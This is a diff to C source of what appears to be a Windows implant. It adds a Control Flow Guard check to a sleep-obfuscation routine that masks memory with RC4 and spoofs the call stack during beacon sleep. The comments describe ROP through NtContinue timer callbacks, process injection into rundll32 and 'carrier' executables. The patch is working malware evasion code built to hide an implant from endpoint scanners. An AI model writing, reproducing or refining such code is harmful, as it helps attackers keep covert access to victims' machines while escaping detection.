@@ -554,6 +554,32 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	unsigned char * rsp_at_wait;
 	BOOL ok = FALSE;
 
+	/* CFG guard: on CFG-enabled hosts NtContinue validates the target RIP
+	 * against the call bitmap - ntdll!memcpy is not a valid indirect
+	 * target there, so every beat died at
+	 * RtlpTpTimerCallback -> ZwContinue -> LdrpHandleInvalidUserCallTarget
+	 * (round 17: spawn children injected into rundll32, c0000409; our EXE
+	 * carriers carry no CFG, which is why the ROP form worked there).
+	 * Degrade to the 1a window: full RC4 masking, plain pointer sleep, no
+	 * stack spoof. Revisit via SetProcessValidCallTargets or a CFG-valid
+	 * copy primitive (roadmap). */
+	{
+		typedef BOOL (WINAPI *GPMP)(HANDLE, int, void *, size_t);
+		GPMP pgpmp = (GPMP)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
+		struct { DWORD flags; } cfg;
+		cfg.flags = 0;
+		if (pgpmp != NULL && pgpmp(GetCurrentProcess(), 6 /* ProcessControlFlowGuardPolicy */,
+		                           &cfg, sizeof(cfg)) && (cfg.flags & 1)) {
+			void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
+				GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
+			if (psleep == NULL)
+				return FALSE;
+			maskfn(ctx);
+			psleep(time);
+			return TRUE;
+		}
+	}
+
 	if (time < 700) {
 		/* short window: the fixed 150/300ms beats would land out of order
 		 * against a wake at time+600 - serve it masked with a plain
